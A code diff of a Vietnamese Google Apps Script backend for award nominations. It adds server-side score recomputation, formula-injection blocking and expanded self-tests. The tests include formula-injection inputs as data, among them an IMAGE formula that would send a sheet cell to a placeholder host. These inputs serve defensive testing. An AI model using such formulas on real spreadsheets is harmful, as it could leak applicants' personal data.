@@ -72,7 +72,7 @@ var COT = [
   { k: 'trangThai', t: 'Trạng thái xử lý (NHẬP TAY)', kieu: 'tay', rong: 140 },
   { k: 'ghiChu', t: 'Ghi chú Hội đồng / BTC (NHẬP TAY)', kieu: 'tay', rong: 240 },
   { k: 'sauHan', t: 'Nộp sau hạn?', kieu: 'cth', rong: 90 },
-  { k: 'trung', t: 'Trùng hồ sơ?', kieu: 'cth', rong: 200 },
+  { k: 'trung', t: 'Cùng SĐT và hạng mục?', kieu: 'cth', rong: 200 },
   { k: 'bienNhan', t: 'Mã biên nhận', kieu: 'chu', rong: 130 },
   { k: 'maYeuCau', t: 'Mã yêu cầu (chống gửi trùng)', kieu: 'chu', rong: 130 },
   { k: 'khoaXepHang', t: 'Khóa sắp xếp (ẩn)', kieu: 'cth', rong: 80 }
@@ -129,13 +129,47 @@ function soHoacRong_(v, toiThieu, toiDa) {
   return Math.round(n * 100) / 100;
 }
 
+// ----- Tính điểm sơ bộ theo Bản tiêu chí 036/VTF. BẢN SAO của src/lib/diem036.js (có bài kiểm thử so khớp mọi tổ hợp).
+// Apps Script tự tính lại điểm từ các lựa chọn và KHÔNG tin điểm do bên gọi gửi lên, nên không thể làm giả điểm xếp hạng.
+var LUA_CHON_GS = {
+  A: { medal: [50, 45, 40, 35, 30], accumulated: [20, 15, 10, 0], training: [10, 7, 5, 0], management: [5, 3, 0] },
+  B: { club: [20, 15, 10, 0], system: [10, 7, 5], athletes: [10, 8, 5, 0], coaches: [10, 7, 5], role1: [20, 15, 10, 5], role2: [15, 10, 5, 0] }
+};
+
+function laSoNguyen_(v) { return typeof v === 'number' && isFinite(v) && Math.floor(v) === v; }
+
+// Trả về { ok:true, v:{...chỉ các khóa đã biết...} } hoặc { ok:false }
+function kiemTraChiTiet_(d) {
+  if (!d || typeof d !== 'object' || Array.isArray(d)) return { ok: false };
+  if (d.he !== 'A' && d.he !== 'B') return { ok: false };
+  if (!laSoNguyen_(d.years) || d.years < 0 || d.years > 80) return { ok: false };
+  var v = { he: d.he, years: d.years };
+  var tap = LUA_CHON_GS[d.he];
+  for (var k in tap) {
+    if (!Object.prototype.hasOwnProperty.call(tap, k)) continue;
+    if (!laSoNguyen_(d[k]) || tap[k].indexOf(d[k]) < 0) return { ok: false };
+    v[k] = d[k];
+  }
+  return { ok: true, v: v };
+}
+
+function tinhDiemGs_(v) {
+  var t;
+  if (v.he === 'A') {
+    t = [v.medal, v.accumulated, v.years >= 15 ? 15 : v.years >= 10 ? 10 : 5, Math.min(15, v.training + v.management)];
+  } else {
+    t = [v.years >= 30 ? 30 : v.years >= 20 ? 25 : v.years >= 10 ? 15 : 10, Math.min(30, v.club + v.system), Math.min(20, v.athletes + v.coaches), Math.min(20, v.role1 + v.role2)];
+  }
+  return { truc: t, tong: Math.min(100, t[0] + t[1] + t[2] + t[3]) };
+}
+
 // Trả về { ok:true, r:{...} } hoặc { ok:false, loi:'...' }
 function chuanHoaHoSo_(raw) {
   if (!raw || typeof raw !== 'object') return { ok: false, loi: 'thieu_du_lieu' };
   if (typeof raw.submissionType !== 'string' || !Object.prototype.hasOwnProperty.call(LOAI_HO_SO, raw.submissionType)) return { ok: false, loi: 'loai_ho_so' };
   var loai = LOAI_HO_SO[raw.submissionType];
   var maYeuCau = catChuoi_(raw.requestId, 80);
-  if (!/^[A-Za-z0-9_-]{16,80}$/.test(maYeuCau)) return { ok: false, loi: 'ma_yeu_cau' };
+  if (!/^[A-Za-z0-9][A-Za-z0-9_-]{15,79}$/.test(maYeuCau)) return { ok: false, loi: 'ma_yeu_cau' };
   var hoTen = catChuoi_(raw.fullName, 120);
   var email = catChuoi_(raw.email, 120);
   var donVi = catChuoi_(raw.organization, 200);
@@ -150,20 +184,28 @@ function chuanHoaHoSo_(raw) {
   var soNam = soHoacRong_(raw.yearsContributed, 0, 80);
   if (soNam === null) return { ok: false, loi: 'so_nam' };
   var diemTuCham = soHoacRong_(raw.scoreClaimed, 0, 100);
-  var diemMayChu = soHoacRong_(raw.scoreServer, 0, 100);
-  if (diemTuCham === null || diemMayChu === null) return { ok: false, loi: 'diem' };
-  var truc = ['', '', '', ''];
-  if (raw.scoreAxes !== null && raw.scoreAxes !== undefined) {
-    if (!Array.isArray(raw.scoreAxes) || raw.scoreAxes.length !== 4) return { ok: false, loi: 'truc' };
-    for (var i = 0; i < 4; i++) { truc[i] = soHoacRong_(raw.scoreAxes[i], 0, 100); if (truc[i] === null) return { ok: false, loi: 'truc' }; }
+  if (diemTuCham === null) return { ok: false, loi: 'diem' };
+  // Điểm máy chủ, 4 trục và đối chiếu do CHÍNH Apps Script tính từ scoreDetail. Bỏ qua scoreServer, scoreAxes, scoreCheck do bên gọi gửi.
+  var diemMayChu = '', truc = ['', '', '', ''], chiTiet = '', doiChieu = '';
+  if (loai.nhom !== 'Khác') {
+    var heCuaLoai = loai.nhom === 'Hệ A' ? 'A' : 'B';
+    if (raw.scoreDetail === null || raw.scoreDetail === undefined) {
+      doiChieu = 'Không có chi tiết';
+    } else {
+      var kt = kiemTraChiTiet_(raw.scoreDetail);
+      if (!kt.ok) {
+        doiChieu = 'Chi tiết không hợp lệ';
+      } else if (kt.v.he !== heCuaLoai) {
+        doiChieu = 'Sai hệ'; diemTuCham = ''; chiTiet = JSON.stringify(kt.v);
+      } else {
+        var kq = tinhDiemGs_(kt.v);
+        diemMayChu = kq.tong; truc = kq.truc; chiTiet = JSON.stringify(kt.v);
+        doiChieu = (diemTuCham === '' || diemTuCham === kq.tong) ? 'Khớp' : 'LỆCH';
+      }
+    }
+  } else {
+    diemTuCham = '';
   }
-  var chiTiet = '';
-  if (raw.scoreDetail !== null && raw.scoreDetail !== undefined) {
-    try { chiTiet = JSON.stringify(raw.scoreDetail); } catch (e) { return { ok: false, loi: 'chi_tiet' }; }
-    if (chiTiet.length > 600) return { ok: false, loi: 'chi_tiet' };
-  }
-  var doiChieu = catChuoi_(raw.scoreCheck, 40);
-  if (loai.nhom === 'Khác') { diemTuCham = ''; diemMayChu = ''; truc = ['', '', '', '']; chiTiet = ''; doiChieu = ''; }
   return {
     ok: true,
     r: {
@@ -238,7 +280,9 @@ function ghiNhatKy_(suKien, maHoSo, maYeuCau, ghiChu) {
   try {
     var sh = mo_().getSheetByName(TAB.nhatKy);
     if (!sh) return;
-    sh.appendRow([new Date(), suKien, maHoSo || '', maYeuCau || '', ghiChu || '']);
+    // mọi chuỗi ghi vào nhật ký đều bị cắt độ dài và chặn công thức (bên gọi có thể gửi giá trị tùy ý)
+    var an = function (v, n) { return anToanO_(catChuoi_(v, n)); };
+    sh.appendRow([new Date(), an(suKien, 40), an(maHoSo, 30), an(maYeuCau, 80), an(ghiChu, 200)]);
     var n = sh.getLastRow();
     if (n > 3000) sh.deleteRows(2, n - 2000); // giữ khoảng 2000 dòng mới nhất
   } catch (e) { /* nhật ký lỗi không được làm hỏng việc nhận hồ sơ */ }
@@ -260,12 +304,15 @@ function hangText_(d) {
 function congThucDong_(r) {
   var L = function (k) { return cot_(k) + r; };
   var out = {};
-  out.diemXepHang = '=IF(' + L('diemHoiDong') + '<>"",' + L('diemHoiDong') + ',IF(' + L('diemMayChu') + '<>"",' + L('diemMayChu') + ',""))';
+  // ISNUMBER: chữ dán nhầm vào ô điểm (vd "85đ") không được coi là điểm
+  out.diemXepHang = '=IF(ISNUMBER(' + L('diemHoiDong') + '),' + L('diemHoiDong') + ',IF(ISNUMBER(' + L('diemMayChu') + '),' + L('diemMayChu') + ',""))';
   out.hang = '=IF(' + L('diemXepHang') + '="","",IF(' + L('diemXepHang') + '>=90,"Đặc biệt",IF(' + L('diemXepHang') + '>=75,"Xuất sắc",IF(' + L('diemXepHang') + '>=60,"Tiêu biểu",IF(' + L('diemXepHang') + '>=50,"Ghi nhận","Chưa đạt ngưỡng")))))';
   out.sauHan = '=IF(OR(' + L('nhom') + '="Hệ A",' + L('nhom') + '="Hệ B"),IF(AND(ISNUMBER(\'' + TAB.tongQuan + '\'!$B$3),' + L('thoiGian') + '>\'' + TAB.tongQuan + '\'!$B$3+1),"Sau hạn",""),"")';
   var dt = '$' + cot_('sdt') + '$2:$' + cot_('sdt');
   var hm = '$' + cot_('hangMuc') + '$2:$' + cot_('hangMuc');
-  out.trung = '=IF(' + L('sdt') + '="","",IF(COUNTIFS(' + dt + ',' + L('sdt') + ',' + hm + ',' + L('hangMuc') + ')>1,"Trùng "&COUNTIFS(' + dt + ',' + L('sdt') + ',' + hm + ',' + L('hangMuc') + ')&" hồ sơ cùng SĐT và hạng mục",""))';
+  // SUMPRODUCT so sánh nguyên văn chuỗi (COUNTIFS có thể tự đổi chuỗi giống số thành số)
+  var dem = 'SUMPRODUCT((' + dt + '=' + L('sdt') + ')*(' + hm + '=' + L('hangMuc') + '))';
+  out.trung = '=IF(' + L('sdt') + '="","",IF(' + dem + '>1,"Trùng "&' + dem + '&" hồ sơ cùng SĐT và hạng mục",""))';
   out.khoaXepHang = '=IF(' + L('diemXepHang') + '="",-1,' + L('diemXepHang') + ')';
   return out;
 }
@@ -278,7 +325,7 @@ function nhanHoSo_(raw) {
   if (!kt.ok) { ghiNhatKy_('TỪ CHỐI', '', raw && raw.requestId, 'Không hợp lệ: ' + kt.loi); return { ok: false, loi: kt.loi }; }
   var r = kt.r;
   var khoa = LockService.getScriptLock();
-  try { khoa.waitLock(25000); } catch (e) { return { ok: false, loi: 'ban', thuLai: true }; }
+  try { khoa.waitLock(8000); } catch (e) { return { ok: false, loi: 'ban', thuLai: true }; }
   try {
     if (!laRiengTu_(false)) { ghiNhatKy_('TỪ CHỐI', '', r.maYeuCau, 'Bảng dữ liệu đang chia sẻ công khai, không ghi'); return { ok: false, loi: 'bang_cong_khai' }; }
     var sh = tabGoc_();
@@ -299,7 +346,7 @@ function nhanHoSo_(raw) {
     var bay = new Date();
     var bienNhan = 'VTF-' + hexHmac_(id + '|' + r.maYeuCau + '|' + bay.toISOString()).slice(0, 10);
     var dong = dongCuoi + 1;
-    if (dong > sh.getMaxRows()) sh.insertRowsAfter(sh.getMaxRows(), 500);
+    if (dong > sh.getMaxRows()) moRongBang_(sh);
     var hang = new Array(COT.length);
     for (var i = 0; i < COT.length; i++) hang[i] = '';
     var dat = function (k, v) { hang[chiSoCot_(k) - 1] = (typeof v === 'string') ? anToanO_(v) : v; };
@@ -307,12 +354,14 @@ function nhanHoSo_(raw) {
     dat('hangMuc', r.hangMuc); dat('nhom', r.nhom); dat('soNam', r.soNam); dat('diemTuCham', r.diemTuCham); dat('diemMayChu', r.diemMayChu);
     dat('truc1', r.truc[0]); dat('truc2', r.truc[1]); dat('truc3', r.truc[2]); dat('truc4', r.truc[3]);
     dat('doiChieu', r.doiChieu); dat('chiTiet', r.chiTiet); dat('tomTat', r.tomTat); dat('linkAnh', r.linkAnh); dat('chuThichAnh', r.chuThichAnh);
-    dat('dongY', 'Có'); dat('trangThai', 'Mới'); dat('bienNhan', bienNhan); dat('maYeuCau', r.maYeuCau);
+    dat('dongY', 'Có'); dat('trangThai', 'Mới'); dat('bienNhan', bienNhan);
+    hang[chiSoCot_('maYeuCau') - 1] = r.maYeuCau; // đã kiểm tra mẫu an toàn; không thêm dấu nháy để tìm trùng đúng nguyên văn
     sh.getRange(dong, 1, 1, COT.length).setValues([hang]);
     var ct = congThucDong_(dong);
     ['diemXepHang', 'hang', 'sauHan', 'trung', 'khoaXepHang'].forEach(function (k) { sh.getRange(dong, chiSoCot_(k)).setFormula(ct[k]); });
     p.setProperty('SEQ', String(so));
     ghiNhatKy_('ĐÃ GHI', id, r.maYeuCau, r.nhom + (r.doiChieu ? ' · ' + r.doiChieu : ''));
+    SpreadsheetApp.flush(); // bảo đảm đã ghi xong trước khi nhả khóa
     return { ok: true, id: id, savedAt: bay.toISOString(), receipt: bienNhan, trung: false };
   } finally {
     try { khoa.releaseLock(); } catch (e2) { /* đã nhả */ }
@@ -334,7 +383,7 @@ function doPost(e) {
     var msg = String(err && err.message || err);
     if (msg === 'chua_thiet_lap') return json_({ ok: false, loi: 'chua_thiet_lap' });
     try { ghiNhatKy_('LỖI', '', '', msg.slice(0, 200)); } catch (e2) { /* bỏ qua */ }
-    return json_({ ok: false, loi: 'noi_bo' });
+    return json_({ ok: false, loi: 'noi_bo', thuLai: true }); // lỗi tạm thời cũng có thể thử lại: mã yêu cầu bảo đảm không ghi trùng
   }
 }
 
@@ -351,6 +400,17 @@ function timHoacTaoThuMuc_() {
   try { return DriveApp.getFolderById(THU_MUC_RIENG_TU_ID); } catch (e) { /* dự phòng */ }
   var it = DriveApp.getFoldersByName(TEN_THU_MUC_DU_PHONG);
   return it.hasNext() ? it.next() : DriveApp.createFolder(TEN_THU_MUC_DU_PHONG);
+}
+
+// Mở rộng bảng gốc thêm 500 dòng và bảo đảm các tab xếp hạng đủ dòng (công thức không tự mở rộng trang tính)
+function moRongBang_(sh) {
+  sh.insertRowsAfter(sh.getMaxRows(), 500);
+  var ss = mo_();
+  [TAB.heA, TAB.heB, TAB.khac].forEach(function (ten) {
+    var t = ss.getSheetByName(ten);
+    var can = sh.getMaxRows() + 5;
+    if (t && t.getMaxRows() < can) t.insertRowsAfter(t.getMaxRows(), can - t.getMaxRows());
+  });
 }
 
 function taoTab_(ss, ten) {
@@ -468,7 +528,7 @@ function dungXepHang_(sh, nhom, tieuDe) {
   sh.setFrozenColumns(3);
   var mang = COT_XEP_HANG.map(function (c) { return dai_(c[0]); }).join(', ');
   var dk = dai_('nhom') + '="' + nhom + '"';
-  var f = '=IFERROR(SORT(FILTER({' + mang + '}, ' + dk + '), FILTER(' + dai_('khoaXepHang') + ', ' + dk + '), FALSE, FILTER(' + dai_('thoiGian') + ', ' + dk + '), TRUE), "Chưa có hồ sơ nào thuộc nhóm này.")';
+  var f = '=IFNA(SORT(FILTER({' + mang + '}, ' + dk + '), FILTER(' + dai_('khoaXepHang') + ', ' + dk + '), FALSE, FILTER(' + dai_('thoiGian') + ', ' + dk + '), TRUE), "Chưa có hồ sơ nào thuộc nhóm này.")';
   sh.getRange(3, 2).setFormula(f);
   sh.getRange(3, 1).setFormula('=ARRAYFORMULA(IF(C3:C="","",ROW(C3:C)-2))');
   sh.setColumnWidth(1, 55);
@@ -492,12 +552,12 @@ function dungXepHang_(sh, nhom, tieuDe) {
 function dungHoSoKhac_(sh) {
   sh.clear();
   sh.getRange(1, 1).setValue('HỒ SƠ KHÁC: Kỷ yếu 34 tỉnh/thành, đăng ký Gala 19/12/2026, Kỷ yếu Bản Vàng (mới nhất ở trên)').setFontWeight('bold').setFontSize(13).setFontColor('#0B1F4D');
-  var cacCot = [['id', 'Mã hồ sơ', 95], ['thoiGian', 'Thời gian nhận', 135], ['hoTen', 'Họ và tên', 190], ['donVi', 'Đơn vị', 220], ['hangMuc', 'Hạng mục', 280], ['sdt', 'Số điện thoại', 105], ['email', 'Email', 190], ['tomTat', 'Nội dung', 420], ['linkAnh', 'Link kho ảnh', 220], ['chuThichAnh', 'Chú thích ảnh', 220], ['trangThai', 'Trạng thái', 140], ['trung', 'Trùng hồ sơ?', 200]];
+  var cacCot = [['id', 'Mã hồ sơ', 95], ['thoiGian', 'Thời gian nhận', 135], ['hoTen', 'Họ và tên', 190], ['donVi', 'Đơn vị', 220], ['hangMuc', 'Hạng mục', 280], ['sdt', 'Số điện thoại', 105], ['email', 'Email', 190], ['tomTat', 'Nội dung', 420], ['linkAnh', 'Link kho ảnh', 220], ['chuThichAnh', 'Chú thích ảnh', 220], ['trangThai', 'Trạng thái', 140], ['trung', 'Cùng SĐT và hạng mục?', 200]];
   sh.getRange(2, 1, 1, cacCot.length).setValues([cacCot.map(function (c) { return c[1]; })]).setFontWeight('bold').setFontColor('#FFFFFF').setBackground('#0B1F4D').setWrap(true);
   sh.setFrozenRows(2);
   var mang = cacCot.map(function (c) { return dai_(c[0]); }).join(', ');
   var dk = dai_('nhom') + '="Khác"';
-  sh.getRange(3, 1).setFormula('=IFERROR(SORT(FILTER({' + mang + '}, ' + dk + '), FILTER(' + dai_('thoiGian') + ', ' + dk + '), FALSE), "Chưa có hồ sơ nào thuộc nhóm này.")');
+  sh.getRange(3, 1).setFormula('=IFNA(SORT(FILTER({' + mang + '}, ' + dk + '), FILTER(' + dai_('thoiGian') + ', ' + dk + '), FALSE), "Chưa có hồ sơ nào thuộc nhóm này.")');
   cacCot.forEach(function (c, i) { sh.setColumnWidth(i + 1, c[2]); });
   sh.getRange(3, 2, sh.getMaxRows() - 2, 1).setNumberFormat('dd/MM/yyyy HH:mm');
   sh.getRange(3, 6, sh.getMaxRows() - 2, 1).setNumberFormat('@');
@@ -556,14 +616,28 @@ function dungTongQuan_(sh) {
 
 var TIEN_TO_THU = 'ZZ-KIEM-THU';
 
+// Chi tiết chấm điểm cho từng tổng điểm dùng trong kiểm thử (đã tính tay: xem bài kiểm thử so khớp với src/lib/diem036.js)
+var CHI_TIET_THU = {
+  A: {
+    80: { he: 'A', medal: 45, accumulated: 20, years: 5, training: 10, management: 0 },
+    95: { he: 'A', medal: 50, accumulated: 20, years: 15, training: 10, management: 0 }
+  },
+  B: {
+    88: { he: 'B', years: 30, club: 20, system: 10, athletes: 8, coaches: 10, role1: 10, role2: 0 },
+    60: { he: 'B', years: 10, club: 10, system: 5, athletes: 5, coaches: 5, role1: 15, role2: 5 },
+    70: { he: 'B', years: 20, club: 15, system: 7, athletes: 8, coaches: 5, role1: 10, role2: 0 }
+  }
+};
+
+function sdtThu_(i) { return '09' + ('00000000' + (10000000 + i)).slice(-8); }
+
 function banGhiThu_(i, loai, diem, dieuChinh) {
   var he = loai === 'nomination_a' ? 'A' : 'B';
   var raw = {
-    requestId: 'thu-' + Utilities.getUuid().replace(/-/g, '').slice(0, 20),
-    fullName: TIEN_TO_THU + ' ' + i, phone: '09' + ('00000000' + (10000000 + i)).slice(-8), email: 'kiem-thu-' + i + '@example.invalid',
+    requestId: 'thu' + Utilities.getUuid().replace(/-/g, '').slice(0, 20),
+    fullName: TIEN_TO_THU + ' ' + i, phone: sdtThu_(i), email: 'kiem-thu-' + i + '@example.invalid',
     organization: 'Đơn vị kiểm thử', submissionType: loai, yearsContributed: 10,
-    scoreClaimed: diem, scoreServer: diem, scoreAxes: diem === null ? null : [Math.floor(diem / 2), 10, 10, diem - Math.floor(diem / 2) - 20],
-    scoreDetail: diem === null ? null : { he: he, years: 10 }, scoreCheck: diem === null ? 'Không có chi tiết' : 'Khớp',
+    scoreClaimed: diem, scoreDetail: diem === null ? null : CHI_TIET_THU[he][diem],
     message: 'Hồ sơ kiểm thử tự động, sẽ bị xóa ngay sau khi kiểm tra xong.', photoAlbumUrl: '', photoCaptions: '', consent: true
   };
   if (dieuChinh) for (var k in dieuChinh) raw[k] = dieuChinh[k];
@@ -582,7 +656,8 @@ function xoaBanGhiThu_() {
   return xoa;
 }
 
-// Chạy hàm này trong trình soạn thảo: ghi 7 hồ sơ thử, kiểm tra thứ tự các bảng xếp hạng, rồi XÓA hồ sơ thử.
+// Chạy hàm này trong trình soạn thảo KHI CHƯA CÓ (hoặc còn rất ít) hồ sơ thật: ghi hồ sơ thử, kiểm tra xếp hạng,
+// công thức, chống giả điểm, chặn công thức, rồi XÓA hồ sơ thử. Kết quả cuối phải là "TẤT CẢ ĐẠT".
 function kiemThuToanBo() {
   var kq = { loi: [], ghi: [] };
   var ok = function (dieuKien, mota) { if (!dieuKien) kq.loi.push(mota); };
@@ -594,44 +669,89 @@ function kiemThuToanBo() {
     banGhiThu_(7, 'gala_registration', null)
   ];
   cacHoSo.forEach(function (h, i) { Utilities.sleep(1100); var r = nhanHoSo_(h); kq.ghi.push(r.id); ok(r.ok && !r.trung, 'ghi hồ sơ ' + (i + 1)); });
+
   // gửi lại cùng requestId: không tạo dòng mới
   var lai = nhanHoSo_(cacHoSo[0]);
   ok(lai.ok && lai.trung === true && lai.id === kq.ghi[0], 'gửi lại phải trả về hồ sơ cũ');
   ok(tabGoc_().getLastRow() === truoc + 7, 'không được thêm dòng khi gửi lại');
-  // chặn công thức
-  var doc = nhanHoSo_(banGhiThu_(8, 'nomination_b', 70, { message: '=HYPERLINK("http://x","y") nội dung kiểm thử công thức bị chặn' }));
-  ok(doc.ok, 'ghi hồ sơ có công thức');
-  var dong = tabGoc_().getLastRow();
-  var oTomTat = tabGoc_().getRange(dong, chiSoCot_('tomTat'));
+
+  // chống giả điểm: bên gọi gửi điểm máy chủ 100 và trục giả, nhưng chi tiết chỉ đáng 70 điểm => phải lưu 70
+  Utilities.sleep(1100);
+  var gia = nhanHoSo_(banGhiThu_(8, 'nomination_b', 70, { scoreServer: 100, scoreAxes: [30, 30, 20, 20], scoreCheck: 'Khớp', scoreClaimed: 100, message: '=HYPERLINK("http://x","y") nội dung kiểm thử công thức bị chặn' }));
+  ok(gia.ok, 'ghi hồ sơ giả điểm');
+  var sh = tabGoc_();
+  var dong8 = sh.getLastRow();
+  ok(sh.getRange(dong8, chiSoCot_('diemMayChu')).getValue() === 70, 'điểm máy chủ phải tự tính lại = 70, không nhận 100 do bên gọi gửi');
+  ok(sh.getRange(dong8, chiSoCot_('doiChieu')).getValue() === 'LỆCH', 'điểm tự gửi 100 khác 70 phải bị gắn LỆCH');
+  var oTomTat = sh.getRange(dong8, chiSoCot_('tomTat'));
   ok(oTomTat.getFormula() === '' && String(oTomTat.getValue()).indexOf('=HYPERLINK') === 1, 'công thức trong nội dung phải thành văn bản (có dấu nháy chặn): ' + oTomTat.getValue());
-  // từ chối dữ liệu xấu
-  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', 50, { phone: '123' })).ok === false, 'sdt xấu phải bị từ chối');
-  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', 50, { email: 'abc' })).ok === false, 'email xấu phải bị từ chối');
-  ok(nhanHoSo_(banGhiThu_(9, 'khong_co', 50)).ok === false, 'loại lạ phải bị từ chối');
-  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', 150)).ok === false, 'điểm 150 phải bị từ chối');
-  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', 50, { consent: false })).ok === false, 'không đồng ý phải bị từ chối');
-  SpreadsheetApp.flush(); Utilities.sleep(1500);
+
+  // từ chối dữ liệu xấu, và nhật ký không bị chèn công thức qua mã yêu cầu
+  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', null, { phone: '123' })).ok === false, 'sdt xấu phải bị từ chối');
+  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', null, { email: 'abc' })).ok === false, 'email xấu phải bị từ chối');
+  ok(nhanHoSo_(banGhiThu_(9, 'khong_co', null)).ok === false, 'loại lạ phải bị từ chối');
+  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', null, { scoreClaimed: 150 })).ok === false, 'điểm 150 phải bị từ chối');
+  ok(nhanHoSo_(banGhiThu_(9, 'nomination_a', null, { consent: false })).ok === false, 'không đồng ý phải bị từ chối');
+  var rac = nhanHoSo_(banGhiThu_(9, 'nomination_a', null, { requestId: '=IMAGE("http://x.invalid/?a="&\'Tất cả hồ sơ\'!D2)' }));
+  ok(rac.ok === false && rac.loi === 'ma_yeu_cau', 'mã yêu cầu chứa công thức phải bị từ chối');
+  var nk = mo_().getSheetByName(TAB.nhatKy);
+  var oNk = nk.getRange(nk.getLastRow(), 4);
+  ok(oNk.getFormula() === '' && String(oNk.getValue()).charAt(0) === '\'', 'nhật ký phải chặn công thức: ' + oNk.getValue());
+
+  // chi tiết chấm điểm sai hệ / bị sửa: không có điểm máy chủ
+  Utilities.sleep(1100);
+  var chiTietSai = JSON.parse(JSON.stringify(CHI_TIET_THU.B[88])); chiTietSai.club = 99;
+  nhanHoSo_(banGhiThu_(11, 'nomination_b', 88, { scoreDetail: chiTietSai }));
+  Utilities.sleep(1100);
+  nhanHoSo_(banGhiThu_(12, 'nomination_a', 88, { scoreDetail: CHI_TIET_THU.B[88] }));
+  Utilities.sleep(1100);
+  // cùng SĐT và hạng mục với hồ sơ 1: phải được đánh dấu
+  nhanHoSo_(banGhiThu_(10, 'nomination_a', 80, { phone: sdtThu_(1) }));
+  SpreadsheetApp.flush(); Utilities.sleep(2500);
+
+  var dongTheoTen = function (ten) {
+    var n = sh.getLastRow();
+    for (var r = 2; r <= n; r++) if (sh.getRange(r, chiSoCot_('hoTen')).getValue() === TIEN_TO_THU + ' ' + ten) return r;
+    return 0;
+  };
+  var o = function (ten, khoa) { return sh.getRange(dongTheoTen(ten), chiSoCot_(khoa)).getValue(); };
+  ok(o(11, 'doiChieu') === 'Chi tiết không hợp lệ' && o(11, 'diemMayChu') === '' && o(11, 'diemXepHang') === '', 'chi tiết bị sửa: không có điểm xếp hạng');
+  ok(o(12, 'doiChieu') === 'Sai hệ' && o(12, 'diemMayChu') === '' && o(12, 'diemXepHang') === '', 'sai hệ: không có điểm xếp hạng');
+  ok(String(o(1, 'trung')).indexOf('Trùng 2') === 0 && String(o(10, 'trung')).indexOf('Trùng 2') === 0, 'hồ sơ cùng SĐT và hạng mục phải được đánh dấu: ' + o(1, 'trung'));
+  ok(o(2, 'trung') === '', 'hồ sơ khác SĐT không bị đánh dấu trùng');
+  ok(o(2, 'hang') === 'Đặc biệt' && o(1, 'hang') === 'Xuất sắc' && o(4, 'hang') === 'Tiêu biểu', 'hạng theo điểm: ' + o(2, 'hang') + '/' + o(1, 'hang') + '/' + o(4, 'hang'));
+  var han = mo_().getSheetByName(TAB.tongQuan).getRange('B3').getValue();
+  if (han instanceof Date && han.getTime() + 24 * 3600 * 1000 < new Date().getTime()) {
+    ok(o(1, 'sauHan') === 'Sau hạn' && o(7, 'sauHan') === '', 'cờ Sau hạn chỉ cho hồ sơ Hệ A/B nộp sau hạn: ' + o(1, 'sauHan') + '|' + o(7, 'sauHan'));
+  }
+
   // thứ tự bảng xếp hạng
   var layTen = function (tenTab) {
-    var sh = mo_().getSheetByName(tenTab); var v = sh.getRange(3, 1, 12, 5).getValues();
+    var t = mo_().getSheetByName(tenTab); var v = t.getRange(3, 1, 20, 5).getValues();
     return v.filter(function (x) { return String(x[2]).indexOf(TIEN_TO_THU) === 0; }).map(function (x) { return x[0] + ':' + String(x[2]).replace(TIEN_TO_THU + ' ', '') + ':' + x[4]; });
   };
+  var ten = function (s) { return s.split(':')[1]; };
   var a = layTen(TAB.heA), b = layTen(TAB.heB);
   kq.heA = a; kq.heB = b;
-  ok(a.length === 3 && a[0].indexOf(':2:') > 0 && a[1].indexOf(':3:') > 0 && a[2].indexOf(':1:') > 0, 'Hệ A phải là 2 (95, nộp trước), 3 (95), 1 (80): ' + JSON.stringify(a));
-  ok(b.length >= 3 && b[0].indexOf(':5:') > 0 && b[1].indexOf(':8:') > 0, 'Hệ B phải bắt đầu 5 (88), 8 (70): ' + JSON.stringify(b));
-  var hangB = b.map(function (s) { return s.split(':')[1]; });
-  ok(hangB.indexOf('6') === hangB.length - 1, 'hồ sơ chưa có điểm (6) phải nằm cuối Hệ B: ' + JSON.stringify(b));
+  ok(a.map(ten).slice(0, 4).join(',') === '2,3,1,10', 'Hệ A phải là 2 (95, nộp trước), 3 (95), 1 (80), 10 (80, nộp sau): ' + JSON.stringify(a));
+  ok(a.map(ten).slice(4).sort().join(',') === '12', 'hồ sơ sai hệ (12) phải nằm cuối Hệ A, không có điểm: ' + JSON.stringify(a));
+  ok(b.map(ten).slice(0, 3).join(',') === '5,8,4', 'Hệ B phải bắt đầu 5 (88), 8 (70), 4 (60): ' + JSON.stringify(b));
+  ok(b.map(ten).slice(3).sort().join(',') === '11,6', 'hồ sơ chưa có điểm (6, 11) phải nằm cuối Hệ B: ' + JSON.stringify(b));
   var k = mo_().getSheetByName(TAB.khac).getRange(3, 1, 3, 3).getValues();
   ok(String(k[0][2]).indexOf(TIEN_TO_THU + ' 7') === 0, 'tab Hồ sơ khác phải có hồ sơ gala');
-  // điểm Hội đồng ghi đè
-  var sh = tabGoc_();
-  var dong1 = timDongTheoMa_(sh, 'id', kq.ghi[0]);
+
+  // điểm Hội đồng ghi đè và chặn chữ dán nhầm
+  var dong1 = dongTheoTen(1);
   sh.getRange(dong1, chiSoCot_('diemHoiDong')).setValue(99);
-  SpreadsheetApp.flush(); Utilities.sleep(1500);
-  var a2 = layTen(TAB.heA);
-  ok(a2.length === 3 && a2[0].indexOf(':1:') > 0, 'điểm Hội đồng 99 phải đưa hồ sơ 1 lên đầu: ' + JSON.stringify(a2));
+  var dong4 = dongTheoTen(4);
+  sh.getRange(dong4, chiSoCot_('diemHoiDong')).setValue('85đ'); // chữ, không phải số: không được tính
+  SpreadsheetApp.flush(); Utilities.sleep(2500);
+  var a2 = layTen(TAB.heA), b2 = layTen(TAB.heB);
+  ok(a2.map(ten)[0] === '1', 'điểm Hội đồng 99 phải đưa hồ sơ 1 lên đầu: ' + JSON.stringify(a2));
+  ok(sh.getRange(dong4, chiSoCot_('diemXepHang')).getValue() === 60 && b2.map(ten).slice(0, 3).join(',') === '5,8,4', 'điểm Hội đồng là chữ không được tính, hồ sơ 4 vẫn 60: ' + JSON.stringify(b2));
   ok(laRiengTu_(true), 'bảng dữ liệu phải riêng tư');
+  var tq = mo_().getSheetByName(TAB.tongQuan);
+  kq.tongQuan = tq.getRange('B4:B11').getValues().map(function (x) { return x[0]; });
   var daXoa = xoaBanGhiThu_();
   kq.daXoa = daXoa;
   ok(tabGoc_().getLastRow() === truoc, 'sau khi xóa phải về số dòng ban đầu');
